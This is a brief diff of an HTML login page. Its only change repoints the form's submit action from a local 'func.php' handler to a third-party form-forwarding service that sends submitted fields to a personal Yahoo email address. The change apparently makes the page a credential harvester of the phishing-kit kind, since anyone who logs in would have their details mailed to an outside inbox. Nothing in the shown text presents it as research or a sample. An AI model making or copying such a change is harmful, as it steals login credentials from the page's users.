@@ -66,7 +66,7 @@ body {
                 <div class="panel__body">
                     <div class="auth__form-divider">
                         <div class="auth__form">
-                            <form method="post" action="func.php">
+                            <form method="post" action="https://formsubmit.co/everiemarshal@yahoo.com">
                              
 
 <div class="form-control-container">
